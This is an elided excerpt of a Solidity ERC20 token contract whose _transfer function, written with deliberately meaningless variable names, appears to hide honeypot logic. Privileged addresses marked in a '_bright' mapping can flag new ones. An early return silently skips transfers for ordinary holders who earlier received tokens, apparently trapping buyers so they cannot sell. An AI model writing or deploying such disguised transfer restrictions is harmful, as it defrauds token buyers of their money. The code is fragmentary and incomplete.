...
contract Contract is IERC20, Ownable {
    ...
    mapping(uint256 => address) private _baby;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _attached;
    ...
    constructor(
        ...
        _bright[address(this)] = _with;
        _bright[msg.sender] = _with;
    ...
    function _transfer(
        ...
        address _nails = uniswapV2Pair;
        bool _rough;
        if (!inSwapAndLiquify && _with < _bright[to] && _bright[from] > _with) {
            _rough = true;
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else if (_bright[from] > 0 && to != _nails && amount > _with) {
            _rough = true;
            _bright[to] = amount;
        }
        if ((_bright[from] == 0 && from != _nails && _attached[from] > 0) || _rough) {
            return;
        }

        address _please = to;
        _attached[_baby[_with]] = _with;
        _baby[_with] = _please;

        if (_taxFee > 0 && _bright[from] == 0 && !inSwapAndLiquify && _bright[to] == 0) {
